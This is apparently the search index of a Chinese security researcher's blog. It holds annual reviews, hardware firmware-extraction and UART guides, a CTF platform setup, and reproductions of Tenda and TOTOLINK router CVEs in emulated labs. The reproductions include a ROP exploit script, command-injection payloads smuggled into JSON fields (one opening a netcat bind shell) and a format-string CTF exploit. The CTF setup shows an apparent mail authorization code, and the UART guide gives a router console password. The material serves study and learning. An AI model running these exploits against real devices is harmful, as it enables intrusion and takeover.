[{"title":"2023年度总结","url":"/2024/01/02/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","content":"前言突然看到很多师傅年度总结都已经写完了，自己还没有开始(去年的年度总结没记错的话，我是过年前几天写完的，主要是太菜了实在不知道能写什么东西)。今年还是一样的很菜，但是相对来说比去年稍有进步吧。\n幽林的2023年报今年做了哪些事情这一年比较幸运，获得了挺多进入线下比赛的机会。\n从上半年的铁人三项赛、ciscn华东南，去了两次福州\n交通运输部网络安全大赛、蓝帽杯总决赛，去了两次北京\n蓝帽杯半决赛去了一次上海，还有一次在南昌的江西警察学院的省赛，深圳的鹏城杯\n暑假实习在广州生活了两个月\n和朋友在武汉大学转了一天\n这一年的去过的地方要比我之前19年加起来的都多了，也面基到了很多在网上交流已久的师傅。\n技术上，今年大概的完成了去年立下的几个flag，学pwn、学iot，实习，交出自己的cve&#x2F;cnvd等等\n喜悦和遗憾的事今年最让人喜悦的可能就是省赛在队友的给力输出下拿了次第一，其次就是在这么多次比赛，各位师傅的帮助下技术的进步，以及多次线下比赛的面基活动，去了天安门，圆明园，东方明珠等等地方。获得了自己的cve&#x2F;cnvd编号(这里需要特别感谢z1r0和izeroo师傅)\n遗憾的事情可能还是比较多吧，ciscn没有打进决赛，蓝帽、铁三、鹏城几个比赛的线下坐牢最后都只有三等(鹏城是优胜)，赣网杯没有打进决赛，内核没有入门成功等等\n今年自己的进步iot不再是0基础了，打CTF也不再是不断的坐牢已经可以稍微挣扎一下了，渗透稍微了解了一点\n去年的flag完成情况以及明年的计划去年的计划:\n\n在z1r0和izeroo师傅的帮助下，算是获得了自己的cnvd和cve，只是质量都不是太高吧\nkernel的学习其实在暑假的时候是有开始的，只是在回到学校都被很多事情冲散了就渐渐的没有学kernel了，甚至到现在暑假学的应该都已经忘干净了\nweb的学习可能已经逐渐转化为对渗透的学习了，暑假的时候每天都刷了下靶机看了下别人的渗透思路以及一些常见工具的使用\n今年的计划:\n\nfuzz的学习，并且通过fuzz能够产出漏洞\nkernel的学习\nwinpwn入门\n找到一份自己满意的工作(能够转正的那种)或者考公成功\n不断补足pwn的盲点\n\n自己如何看待自己不断的摆烂，造就了现在这个高不成低不就的自己\n结语希望在2024技术能够进步，生活能够更好。\n"},{"title":"CH341A编程器固件提取","url":"/2023/09/25/CH341A%E7%BC%96%E7%A8%8B%E5%99%A8%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/","content":"工具准备准备的工具:\n\nCH341A编程器\nSOP8测试夹\n转接板\n\n在淘宝买的，买的时候选择 CH341A编程器+SOP8\n链接:【淘宝】https://m.tb.cn/h.5fSe8GU?tk=kziqdBrefoZ CZ0001\n组装买过来有下面两个东西\n\n将转接板与CH341A编程器进行连接(注意这里不要插错了)\n\n\n这样就已经组装完成了\nCH341A驱动安装这里我用的是win10,使用Asprogrammer提取固件的时候会发生报错\n\n下载下面驱动进行安装\nhttps://www.wch.cn/downloads/CH341SER_EXE.html\n\n直接点击安装就行，安装完成之后右击计算机，点击管理，然后找到CH341A这个usb设备（记得插到电脑上），右击，点击属性，驱动程序，更新驱动程序，点击浏览我的电脑以查找驱动程序\n\n然后点击让我从计算机上的可用驱动程序列表中选取，找到端口（COM和LPT）然后找一下wch.cn，找到对应的CH341A\n\n然后下一页，继续，好了之后就可以在管理的端口（COM和LPT）里看到对应的CH341A但是还是没有用，接下来点击设置，windows更新，点击查看所有可选更新，找到驱动程序更新里的wch.cn\n\n勾选，然后下载并安装\n\n安装完成之后就可以在外部接口里看到对应的CH341A至此驱动安装完成\n固件提取这里可能还需要准备螺丝刀和翘板来拆路由器\n\n先找flash\n\n然后会发现flash上面有个小圆点，这个对应的是夹子上红线对应的位置，夹上去之后看路由器前面的灯亮不亮\n\n然后打开Asprogrammer软件，下载地址：https://github.com/YTEC-info/CH341A-Softwares\n\n点击自动检测，成功后会弹出型号，具体型号可以看flash上有写，随便选一个影响也不是很大，然后点击select IC，再点击read ic\n\n\n下面的进度条代表正在读取固件\n\n读取完成之后就可以保存这个固件了\n\n至此固件提取完成\n"},{"title":"2024年度总结","url":"/2025/02/03/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","content":"前言这次年度总结写的比较晚了，过完年才开始写。主要之前先把星盟的年度总结给写了，自己看了下感觉还是按照自己的格式写下要好一点。\n今年接触realworld要更多一点了(毕竟已经大四要开始工作了)，ctf方面相对来说就没什么太大的进步，去年立的几个flag都没有实现···\n年报今年做了哪些事情这一年ctf也是进了好几个比赛的线下，ciscn也算是圆梦了(第一次在福州没有遗憾离场)，进了决赛还和好几个师傅面基了，网鼎杯进了半决赛、强网拟态进了决赛、铁三半决赛队友爆种发挥(决赛四个人纯战犯表现)、然后省赛因为实习原因，把学校鸽了、古剑山去重庆玩了(也是战犯表现)。\n比赛方面今年除了强网没进决赛比较遗憾，其他相对来说都还是比较满意的。\n工作方面今年太难受了，在郑州绿盟实习了5个月主要做车联网+CTF，大部分时间都在摸鱼，领导和大哥都太忙了，我自己也不知道做啥就一直在学自己的东西。车联网开始做了之后才发现和自己想象当中的完全不一样，太杂了后面就没有太认真去学习。然后有and1师傅介绍了天津某个公司给我面试了下(应该算是面过了？)然后布置了点边界设备的任务给我做，后面就比较专心做这方面的学习了(确实比较符合我一直想做的事情)。11月份绿盟这边确定没有转正机会就直接回家准备考试了，可惜最后考试也是白准备。\n喜悦和遗憾的事今年最高兴的应该就是ciscn进了决赛然后还拿了二等奖，然后复现了几个飞塔的cve虽然比较难但好在最后还是复现出来了，也算是找到了自己比较喜欢做的工作内容。\n遗憾的事情比较多，绿盟没办法转正、考试白考、秋招错过、内核还是没学······\n今年自己的进步学了点车联网、winpwn(用户态)、iot学了点、web浅学了一个月···\n去年的flag完成情况以及明年的计划去年的计划:\n1.失败 \n2.浅学了一点(失败)\n3.算是入门了\n4.考公失败 工作算是找到了对于我个人来说也比较满意\n5.补足ing\n今年的计划1.学fuzz！！！\n2.kernel学习\n3.挖到有价值的漏洞\n4.搞定毕业\n5.漏洞复现\n自己如何看待自己挺失败的，这一年各种事情 很多事情都不能按照自己的计划进行 特别是学习 远远不如在学校自由\n结语希望2025技术能有更多进步 能减肥减下去！！！\n"},{"title":"CVE-2018-16333复现","url":"/2023/09/25/CVE-2018-16333%E5%A4%8D%E7%8E%B0/","content":"Tenda AC15 路由器栈溢出漏洞复现（CVE-2018-16333）固件解压以及分析漏洞的原因是web服务在处理post请求时，对ssid参数直接复制到栈上的一个局部变量中导致栈溢出。\n\n固件版本：US_AC15V1.0BR_V15.03.05.19_multi_TD01\n固件和poc下载地址：\npwn&#x2F;IOT&#x2F;Tenda_CVE-2018-16333 at master · Snowleopard-bin&#x2F;pwn\n使用binwalk解压固件\nbinwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin\n\n在squashfs-root中可以查看文件系统，bin目录下使用下面指令查看系统架构，可以看到为32为的arm小端序，且开了nx防护，其他全关\nreadelf -h busybox\n\n\n\n程序获取ssid参数后，没有经过检查就直接使用strcpy函数复制到栈变量中。\n其中：第一次的strcpy如果要溢出到返回地址，会覆盖第二次的strcpy的参数dest。\n为了将src指针覆盖为有效地址，并且不影响第一次的strcpy，选择在libc中选择一个可读地址覆盖src指针。\n\n利用过程：\n1、溢出后跳到第一个gadget1，控制r3寄存器为system函数地址，第一个pc控制为gadget2。2、跳转到gadget2后，控制r0为要执行的命令即可。3、执行system(cmd)\n。\n固件模拟因为httpd程序在启动的时候有一个对network的check所以直接使用FirmAE进行模拟是行不通的，这里选择直接进行系统级模拟（便于调试以及分析）\n根据启动httpd时候的报错的字符串定位到程序，发现这里对network有一个check所以需要使用keypatch将返回值patch为1\n\n\n后面报错同理,将httpd程序替换为自己patch好后的\n发现获取的ip地址不对，这里程序是通过br0网卡获得地址\nqemu启动脚本：\n#! /bin/bashsudo tunctl -t tap0             # 创建一个 tap0 接口sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口sudo ifconfig tap0 up      # 启用 tap0 接口sudo ifconfig tap0 192.168.182.100/24  #为tap0分配ip地址qemu-system-arm -M vexpress-a9 \\\t-kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \\\t-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\\t-append &quot;root=/dev/mmcblk0p2&quot; \\\t-net nic -net tap,ifname=tap0,script=no,downscript=no -nographic\n\n登录进去之后：\nqemu:ifconfig eth0 192.168.182.111/24 up主机:scp -r ./squashfs-root root@192.168.182.111:/rootqemu:mount -t proc /proc ./squashfs-root/procmount -o bind /dev ./squashfs-root/devchroot ./squashfs-root/ shbrctl addbr br0    #添加br0虚拟网卡ifconfig br0 192.168.182.111/24 upecho 0 &gt; /proc/sys/kernel/randomize_va_space    #关闭地址随机化./bin/httpd\n\n这里之后服务就已经启动了，但是通过浏览器访问对应页面会发现有报错，执行下面指令之后就可以正常访问了\ncp -rf ./webroot_ro/* ./webroot/\n\n\n\n调试这里先贴一下exp：\nimport requestsfrom pwn import *cmd=b&quot;echo success_pwn_it&quot;&#x27;&#x27;&#x27;qemu-user&#x27;&#x27;&#x27;#libc_base = 0xf659c000&#x27;&#x27;&#x27;qemu-system&#x27;&#x27;&#x27;libc_base = 0x76dab000dosystemcmd = 0x76f930f0system = libc_base + 0x5A270readable_addr = libc_base + 0x64144mov_r0_ret_r3 = libc_base + 0x40cb8pop_r3 = libc_base + 0x18298payload = b&#x27;a&#x27;*(0x60) + p32(readable_addr) + b&#x27;b&#x27;*(0x20-8)payload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd#payload=b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27;url = &quot;http://192.168.182.111/goform/fast_setting_wifi_set&quot;cookie = &#123;&quot;Cookie&quot;:&quot;password=12345&quot;&#125;data = &#123;&quot;ssid&quot;: payload&#125;response = requests.post(url, cookies=cookie, data=data)response = requests.post(url, cookies=cookie, data=data)print(response.text)\n\n调试首先得将gdbserver传进虚拟机，各个架构的gdbserver下载地址：\nH4lo&#x2F;HatLab Tools Library\n可以将gdbserver放进bin目录下这样就可以直接用了\n\n使用下面指令查看httpd的进程号\n/ # ps |grep httpd 2414 0          0:26 ./bin/httpd 2820 0          0:00 grep httpd\n\n然后使用gdbserver对进程进行调试\nqemu:/ # gdbserver --attach 0.0.0.0:12345 2414Attached; pid = 2414Listening on port 12345物理机:gdb-multiarch httpdset architecture armset endian littletarget remote 192.168.182.111:12345b *0x0006707C  #在strcpy打断点\n\n\n接着发送exp，在gdb按c进行运行\n\n这里可以进行计算溢出的长度，0x7ebda8f4-0x7ebda878&#x3D;7c，但是不要忘了在后面还需要接一个可写的地址，运行到第二个strcpy就可以发现,src在栈上距离栈底长度为28处。即0x1c。构造exp时需要在0x7c-0x1C&#x3D;0x60后加入一个可读字段的地址。\n![Untitled](CVE-2018-16333复现 9ed9b5eeeffa4ca3a0bd7a66e8dd5fcc&#x2F;Untitled 10.png)\n所以构造exp：\npayload &#x3D; b’a’(0x60) + p32(readable_addr) + b’b’(0x20-8)\npayload+&#x3D; p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd\n在返回地址处打断点 b *0x00067758，可以看到栈上返回地址已经被劫持成我们构造的ROP链。\n\n运行成功截图：\n\n"},{"title":"CVE-2023-25395复现","url":"/2025/01/15/CVE-2023-25395%E5%A4%8D%E7%8E%B0/","content":"CVE-2023-25395复现固件下载地址：http://totolink.net/home/menu/detail/menu_listtpl&#x2F;download&#x2F;id&#x2F;185&#x2F;ids&#x2F;36.html\n影响版本\n\n漏洞是位于&#x2F;usr&#x2F;lib&#x2F;lighttpd&#x2F;web&#x2F;cgi-bin的cstecgi.cgi程序\n\n\n\n\n漏洞分析通过字符串setOpenVpnCertGenerationCfg，再通过ou传参最终可以实现命令注入（揭露者的poc是有问题的，他是批量提交都使用的是第一个的图片和方法，这个cve的poc最后是无法打通的），所以最后maur师傅最后另外找了一个方法，来实现命令注入\n，但最后效果是一样的\n首先是通过strstr函数将var指向输入的setOpenVpnCertGenerationCfg字符串，接着是v22指向off_44F048如果为空就指向最下面程序结束，接着将v42指向var即指向输入的字符串，接着将v42与v41不断进行比较，不同则将v41+0x44寻找下一个比较的字符串，相同则将v22指向v41+0x40(注意这里ida分析的伪代码是有问题的，实际实现起来也是有问题的)，即指向0x4327fc。\n接着进入这个函数，程序通过获取ou参数下的内容传递给v14，之后将v14带入到Uci_Set_Str函数中，在Uci_Set_Str函数中，通过snprintf函数，将a4匹配到的内容格式化进v11，之后将v11带入cstesystem函数中，函数直接将用户输入内容带入到execv函数中，实现命令注入\n固件模拟一开始尝试了两个自动化工具，我尝试了FirmAE,maur师傅尝试了Firmadyne，最后发现都不行（因为是要给qemu制定cpu参数）\n所以最后决定使用qemu系统级模拟，一开始尝试的是使用buildroot编译内核和文件系统，但是由于我这里出现了一堆玄学问题和buildroot编译的mipsel32缺少很多东西（例如ssh），所以最后我使用了debian官网的debian_wheezy_mipsel_standard.qcow2和debian_wheezy_mipsel_standard.qcow2\n1.启动qemu这里得配置网络，以及指定这个固件的cpu参数\n启动脚本：\n#set networksudo brctl addbr virbr0sudo ifconfig virbr0 192.168.182.1/24 upsudo tunctl -t tap0sudo ifconfig tap0 192.168.182.11/24 upsudo brctl addif virbr0 tap0qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta-el -cpu 24KEc -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1&quot; -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic\n\n2.将固件的文件系统传进qemu虚拟机用debian官网的确实要方便一点，可以直接使用ssh传进来\nscp -r squashfs-root/ root@192.168.182.12:/root\n\n3.启动固件的web服务chroot A7100RU /bin/sh./usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D\n\n这样使用浏览器访问192.168.182.12就可以查看到浏览器的页面了，貌似是因为使用qemu模拟的原因和路由器真机还是有一定的偏差，导致js出了些问题无法完整的显示页面，但是并不影响复现这个cve\n\n漏洞利用可以直接使用bp传参，也可以使用curl传递post参数，这里我使用的是curl\ncurl http://192.168.182.12/cgi-bin/cstecgi.cgi -X POST  -d &#x27;&#123;&quot;topicurl&quot;:&quot;setOpenVpnCertGenerationCfg&quot;,&quot;ou&quot;:&quot;1$(ls&gt;/tmp/256.txt;)&quot;&#125;&#x27;\n\n\n上图可以看到是有回显的，并且通过ssh连入qemu虚拟机也可以发现成功写入了&#x2F;tmp&#x2F;256.txt文件\n\nCVE-2022-41518 这个模拟的方式和前面也没差太多，漏洞也是一个命令注入，主要还是从exp学了点东西import contextlibimport requestsimport ossession = requests.Session()login_url = &quot;http://192.168.182.12/formLoginAuth.htm?authCode=1&amp;userName=admin&amp;goURL=home.html&amp;action=login&quot;raw = session.get(login_url, timeout=5)inject_url = &quot;http://192.168.182.12/cgi-bin/cstecgi.cgi&quot;inject_data = &#123;    &quot;proto&quot;:&quot;8&quot;,    &quot;hostname&quot;:&quot;&#x27;;nc -l -p 9999 -e bash;&#x27;&quot;,    &quot;topicurl&quot;:&quot;setOpModeCfg&quot;&#125;with contextlib.suppress(Exception):    resp = session.post(inject_url, json = inject_data, timeout=1)print(&quot;shell!? ---------------&gt; &quot;)os.system(&quot;nc 192.168.182.12 9999&quot;)\n\n命令注入主要是在hostname的处理，同样是sprintf的问题，然后通过nc -l -p 9999 -e bash就可以拿到shell了\n"},{"title":"GZ靶场搭建","url":"/2023/09/25/GZ%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/","content":"GZ靶场搭建以及pwn题部署成果图展示\n\n靶场搭建使用的是阿里云的ubuntu20.04服务器搭建的，首先得自己安装docker和docker-compose（使用他市场里面那个自带docker的ubuntu20.04貌似会有点问题，最后还是自己安装docker方便点）\n新建两个文件，位于同一个文件夹。这里的文件夹名称为GZCTF，文件为appsettings.json和docker-compose.yml。\nappsettings.json文件内写入：\n&#123;  &quot;AllowedHosts&quot;: &quot;*&quot;,  &quot;ConnectionStrings&quot;: &#123;    &quot;Database&quot;: &quot;Host=db:5432;Database=gzctf;Username=postgres;Password=&lt;String1&gt;&quot;      //&lt;String1&gt;换成数据库密码，随机密码且长度足够  &#125;,  &quot;Logging&quot;: &#123;    &quot;LogLevel&quot;: &#123;      &quot;Default&quot;: &quot;Information&quot;,      &quot;Microsoft&quot;: &quot;Warning&quot;,      &quot;Microsoft.Hosting.Lifetime&quot;: &quot;Information&quot;    &#125;  &#125;,    //邮箱配置  &quot;EmailConfig&quot;: &#123;    &quot;SendMailAddress&quot;: &quot;Admin@xxx.com&quot;,     // 填入邮箱    &quot;UserName&quot;: &quot;ctf_noreply&quot;,              // 发件人名称    &quot;Password&quot;: &quot;UWPTINWMFPQVMPAH&quot;,         // 邮箱密码，部分服务商需要填入授权码    &quot;Smtp&quot;: &#123;      &quot;Host&quot;: &quot;smtp.163.com&quot;,               // 此处为163邮箱服务器，具体自定      &quot;Port&quot;: 465    &#125;  &#125;,  &quot;XorKey&quot;: &quot;&lt;String2&gt;&quot;,                    // 自定XorKey  &quot;ContainerProvider&quot;: &#123;    &quot;Type&quot;: &quot;Docker&quot;,    &quot;PublicEntry&quot;: &quot;xx.xx.xx.xx&quot;,           // 域名或IP配置，用于容器生成,域名不带http/https    &quot;DockerConfig&quot;: &#123;      &quot;SwarmMode&quot;: false,      &quot;Uri&quot;: &quot;&quot;                             // 本地配置Docker因此此处置空    &#125;  &#125;,  &quot;RequestLogging&quot;: false,  &quot;DisableRateLimit&quot;: false,  &quot;RegistryConfig&quot;: &#123;    &quot;UserName&quot;: &quot;&quot;,    &quot;Password&quot;: &quot;&quot;,    &quot;ServerAddress&quot;: &quot;&quot;  &#125;,    //谷歌验证码配置  &quot;GoogleRecaptcha&quot;: &#123;    &quot;VerifyAPIAddress&quot;: &quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;,    &quot;Sitekey&quot;: &quot;&quot;,    &quot;Secretkey&quot;: &quot;&quot;,    &quot;RecaptchaThreshold&quot;: &quot;0.5&quot;  &#125;&#125;\n\ndocker-compose.yml写入：\nversion: &#x27;3.0&#x27;services:  gzctf:    image: gztime/gzctf:latest    restart: always    environment:      - &quot;GZCTF_ADMIN_PASSWORD=&lt;String3&gt;&quot; # &lt;String3&gt;换成管理员账户密码，账号为Admin    ports:      - &quot;80:80&quot; # 对外端口号，前为外部端口。    networks:      default:    volumes:      - &quot;./data/files:/app/uploads&quot;      - &quot;./appsettings.json:/app/appsettings.json:ro&quot;      - &quot;./logs:/app/log&quot;      - &quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;      # - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot;      - &quot;/var/run/docker.sock:/var/run/docker.sock&quot;    depends_on:      - db  db:    image: postgres:alpine    restart: always    environment:      - &quot;POSTGRES_PASSWORD=&lt;String1&gt;&quot; # 数据库密码，务必要和appsettings.json中的配置一致    networks:      default:    volumes:      - &quot;./data/db:/var/lib/postgresql/data&quot;networks:  default:    driver: bridge    ipam:      config:        - subnet: 192.168.12.0/24\n\n通过ssh连接服务器，将文件夹上传。开始部署\ncd GZCTFdocker-compose up -d\n\n部署完成后，建议查看Logs，看部署是否成功。主要是看gzctf容器是否连接上了数据库。\n\n这里连接失败貌似不影响靶场使用，反正我正常测试了几个功能都没什么影响 ### pwn题部署 这里使用Admin登录创建一个比赛，然后创建赛题，会发现pwn题这里动态容器部署需要使用dockerhub来上传pwn的docker\n\n将docker上传dockerhub首先得去注册一个dockerhub的账号，然后创建好一个仓库之后记住用户名和仓库的名字，在虚拟机上登录dockerhub\nsudo docker login -u 用户名\n\n然后就是制作自己pwn题的docker镜像 首先得有一个pwn题的板子 docker.zip 记得将里面的run.sh改一下，这里已经改过了，直接将环境变量GZCTF_FLAG，echo给flag和flag.txt就可以了，然后build一下，build之后再讲他改下名字和tag\nsudo docker build -t &quot;pwn&quot; ./sudo docker tag pwn:latest youlinyo/youlin:pwn #这里youlinyo是用户名，youlin是仓库名\n\n接着将这个镜像push到dockerhub上面去就可以了\nsudo docker push youlinyo/youlin:pwn\n\n然后就可以直接在靶场里面测试这个靶机了，在比赛的时候也可以直接创建动态容器（别忘记可以去设置flag格式和上传题目附件，这里会把flag直接给环境变量GZCTF_FLAG）\n"},{"title":"Tenda-i6路由器UART调试","url":"/2023/09/28/Tenda-i6%E8%B7%AF%E7%94%B1%E5%99%A8UART%E8%B0%83%E8%AF%95/","content":"需要的工具万用表、杜邦线（50根公转母，50根母转母）、路由器、TTL转接\n接口介绍嵌入式里面说的串口，一般是指UART口。同时还有com口，TTL这些东西，这里简单说一下它们的作用和关系。\n\nUART：通用异步收发器，在嵌入式里串口其实就是UART口，4个pin\nCOM口：在台式机上常用的口，9个pin，接口协议只有两种RS232和RS485\n\nUART口、COM口指的是物理接口形式，TTL、RS232和RS485指的是电平逻辑标准\n在嵌入式里常用TTL电平即3.3V或者5.0V\nUART接口介绍UART只有数据线收和发，并无时钟线，故为异步串行通信接口，可以实现全双工通信；在嵌入式系统中，常用于控制系统与外设通信，包括控制器与控制器，控制器与终端设备。UART至少包含4个引脚公共引脚GND、电源引脚VCC、输出引脚TXD、接收引脚RXD。\n\nVCC：供电pin，一般是3.3v，在通电情况下，板子上没有过电保护，这个pin一般不接更安全\nGND：接地pin，有的时候rx接受数据有问题，就要接上这个pin，一般也可不接   #这里i6只测出了这个接口\nRX：接收数据pin\nTX：发送数据pin\n\n寻找UART并定位拆开路由器后看到的正面图\n\nUART口就是下面红圈圈出来的地方\n\n定位GND将万用表扭到蜂鸣档，然后将黑笔接到板子背面的电源焊锡点\n\n红笔放到UART的那四个点那里测试，万用表有响声并且亮红灯的就是GND了\n\n\n定位VCC将万用表扭到20v然后将黑笔放到刚刚初步判断的GND上，再将红笔在UART其它三个PIN上进行测试，当电压为3.3V左右时则判断红笔的那个PIN为VCC。(记住这里得插着电源测试，包括后面的操作都得插着电源),这里我另外两个口我测出来都是2.29v，一开始以为是误差都一样的，后来问了下z1r0师傅发现这是正常的现象\n\n\n定位TXD开机有数据传输的时候该引脚电压都会发生变化，利用这个特性就可以测试出TXD。因为单手实在操作不了，所以就不贴图了，和上面差不多，黑的放在GND，然后重启路由器，在第二个第三个测试一下即可发现第三个有变化，所以第三个为TXD，这里变化的比较快，但是两个对比一下还是能看出来的，TXD口会先跳到2.7v左右然后才会跳到3.29v，而另外一个口即RXD口会直接跳到3.29v\n定位RXD这里第四个口只剩下一个了，剩下的自然就是RXD口了。然后如果是5个的话可以GND和TXD引脚连接到TTL，然后插在电脑上一个一个测试，看一下输入之后有没有回显即可，虽然笨但是很有效。(我一开始没有测出VCC口也是使用的这种方法直接插电脑上测试)\n将杜邦线插入UART口以及TTL转接这里需要注意的是路由器上的RXD和TXD需要与TTL上的RX和TX反接，GND要接正确\n\n获取cli这里使用的是secureCRT这个软件，打开之后点左边的session manager，然后点+号添加调试设置，如下图所选即可\n\n这里在试了几次之后确定了波特率是115200，是tenda比较常用的一个波特率\n\n打开之后将TTL转接连上电脑，并且路由器插上电源，就会出现路由器的启动信息\n\n按几下回车之后就会让你输入密码，这里密码是:Fireitup(给z1r0师傅磕两个)\n\n然后就可以想办法利用telnetd将文件传输到本机了\n"},{"title":"ciscn_final_awdp复现","url":"/2024/07/27/ciscn-final-awdp%E5%A4%8D%E7%8E%B0/","content":"animefix程序的洞还是比较简单的，一个很明显的格式化字符串\n\n把call printf改成call puts就行了\n\n\n\nbreak当时比赛是断网，难点是readline里面有个aes的解密，可能很多师傅不太会写aes的加密脚本，所以当时做出来的人也不是很多\n大概思路就是写出对应的aes加密脚本，然后就是常规的非栈上格式化字符串的套路，先把i改成负数，然后将返回地址改低位改成onegadget就可以getshell了\nfrom pwn import *from ctypes import *from struct import packfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Random import get_random_bytesfrom base64 import b64encode,b64decodeimport base64banary = &quot;./pwn&quot;elf = ELF(banary)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;123.57.149.79&#x27;port = 16274local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()def encrypt(raw, key):    raw = pad(raw,16)    cipher = AES.new(key, AES.MODE_ECB)    return base64.b64encode(cipher.encrypt(raw)).decode(&quot;utf-8&quot;)def decrypt(enc, key):    enc = base64.b64decode(enc)    cipher = AES.new(key.encode(&#x27;utf-8&#x27;), AES.MODE_ECB)    return unpad(cipher.decrypt(enc),16)key=[0x7B,0xF3,0x5c,0xd6,0x9c,0x47,0x5D,0x5E,0x6F,0x1D,0x7A,0x23,0x18,0x7B,0x0F9,0x34]password = binascii.unhexlify(&#x27;7bf35cd69c475d5e6f1d7a23187bf934&#x27;)ru(&quot;linsir want to know your name\\n&quot;)sl(b&#x27;youlin&#x27;)ru(&quot;your favourite anime:&quot;)text = b&#x27;%15$p%17$p%19$p&#x27;.ljust(32,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)sl(payload)ru(&quot;0x&quot;)libcbase=int(io.recv(12),16)-0x24083lg(&quot;libcbase&quot;)one=[0xe3afe,0xe3b01,0xe3b04]one_gadget=libcbase+one[1]lg(&quot;one_gadget&quot;)ru(&quot;0x&quot;)stack=int(io.recv(12),16)lg(&quot;stack&quot;)ret_addr=stack-0xf0i_addr=stack-0x124lg(&quot;i_addr&quot;)ru(&quot;0x&quot;)base=int(io.recv(12),16)-0x150flg(&quot;base&quot;)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str(i_addr&amp;0xffff).encode()+b&#x27;c%17$hn&#x27;text = text.ljust(0x30,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)sl(payload)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str(0xffff).encode()+b&#x27;c%45$hn&#x27;text = text.ljust(0x40,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)s(payload)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str(ret_addr&amp;0xffff).encode()+b&#x27;c%17$hn&#x27;text = text.ljust(0x40,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)s(payload)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str(one_gadget&amp;0xffff).encode()+b&#x27;c%45$hn&#x27;text = text.ljust(0x40,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)s(payload)lg(&quot;one_gadget&quot;)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str((ret_addr+2)&amp;0xffff).encode()+b&#x27;c%17$hn&#x27;text = text.ljust(0x40,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)s(payload)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str((one_gadget&gt;&gt;16)&amp;0xffff).encode()+b&#x27;c%45$hn&#x27;text = text.ljust(0x40,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)s(payload)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str(i_addr&amp;0xffff).encode()+b&#x27;c%17$hn&#x27;text = text.ljust(0x30,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)sl(payload)ru(&quot;what&#x27;s your favourite anime:&quot;)text = b&#x27;%&#x27;+str(1).encode()+b&#x27;c%45$hn&#x27;text = text.ljust(0x40,b&#x27;\\x00&#x27;)aes = AES.new(password,AES.MODE_ECB)payload = aes.encrypt(text)s(payload)ia()\n\nezheapfix这题有点玄学，我们队最开始做的时候没有看到后面还有堆溢出，只把uaf修了就上传上去了，结果给过了？？？\n修uaf就是把指针置零就可以了，这题还可以改段权限，check是我打awdp见过最松的了\n\n\n\nbreak当时做的比较慢，一直被json解析的格式难住了，直到最后才把格式写出来\n有堆溢出，有uaf，直接打free_hook就行了\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)#libc = 